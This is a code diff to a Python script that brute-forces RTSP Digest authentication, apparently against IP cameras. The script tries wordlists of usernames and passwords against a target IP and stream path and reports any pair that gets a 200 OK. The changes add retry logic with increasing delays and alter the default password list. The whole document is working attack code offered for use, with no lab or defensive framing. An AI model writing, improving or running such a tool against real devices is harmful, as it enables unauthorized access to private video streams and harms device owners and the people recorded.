@@ -66,7 +66,7 @@ def load_wordlist(path, fallback):
     return fallback
 
 def main():
-    parser = argparse.ArgumentParser(description="RTSP Digest Auth Brute-Forcer")
+    parser = argparse.ArgumentParser(description="RTSP Digest Auth Brute-Forcer with Retry and Throttle")
     parser.add_argument("ip", help="Target IP")
     parser.add_argument("path", help="RTSP path (e.g. Streaming/Channels/1)")
     parser.add_argument("-p", "--port", type=int, default=554, help="RTSP port (default: 554)")
@@ -76,9 +76,9 @@ def main():
     args = parser.parse_args()
 
     usernames = load_wordlist(args.userlist, ["admin", "user", "root"])
-    passwords = load_wordlist(args.passlist, ["admin", "1234", "password", "toor"])
-
+    passwords = load_wordlist(args.passlist, ["admin", "1234", "password", "P@ssw0rd"])
     uri = f"/{args.path}"
+
     print(f"[*] Connecting to rtsp://{args.ip}:{args.port}{uri}")
     response = send_rtsp_request(args.ip, args.port, args.path, "OPTIONS")
     if "401 Unauthorized" not in response or "WWW-Authenticate" not in response:
@@ -94,24 +94,40 @@ def main():
     nonce = auth["nonce"]
 
     print("[*] Starting brute-force...")
+
     for username in usernames:
         for password in passwords:
-            digest = compute_digest(username, password, realm, nonce, "DESCRIBE", uri)
-            auth_header = (
-                f'Digest username="{username}", realm="{realm}", nonce="{nonce}", '
-                f'uri="{uri}", response="{digest}", algorithm=MD5'
-            )
-            headers = {"Authorization": auth_header}
+            retry_delay = args.throttle
+            retry_attempts = 0
+            while True:
+                digest = compute_digest(username, password, realm, nonce, "DESCRIBE", uri)
+                auth_header = (
+                    f'Digest username="{username}", realm="{realm}", nonce="{nonce}", '
+                    f'uri="{uri}", response="{digest}", algorithm=MD5'
+                )
+                headers = {"Authorization": auth_header}
 
-            resp = send_rtsp_request(args.ip, args.port, args.path, "DESCRIBE", headers)
-            print(f"[*] Tried {username}:{password} - Response Length: {len(resp)}")
+                resp = send_rtsp_request(args.ip, args.port, args.path, "DESCRIBE", headers)
+                length = len(resp)
+                print(f"[*] Tried {username}:{password} - Response Length: {length}")
 
-            if "200 OK" in resp:
-                print(f"[+] SUCCESS: {username}:{password}")
-                return
+                if length > 0:
+                    if "200 OK" in resp:
+                        print(f"[+] SUCCESS: {username}:{password}")
+                        return
+                    break  # Continue to next password
 
-            if args.throttle > 0:
-                time.sleep(args.throttle)
+                # If response is empty, retry with increasing delay
+                retry_attempts += 1
+                if retry_attempts == 1:
+                    print(f"[!] Empty response, retrying {username}:{password} once...")
+                elif retry_attempts <= 5:
+                    retry_delay += 0.1
+                    print(f"[!] Still empty. Increasing delay to {retry_delay:.1f}s (Attempt {retry_attempts})")
+                else:
+                    print(f"[!] Max delay reached ({retry_delay:.1f}s). Retrying until success...")
+
+                time.sleep(retry_delay)
 
     print("[-] Brute-force complete. No valid credentials found.")
 
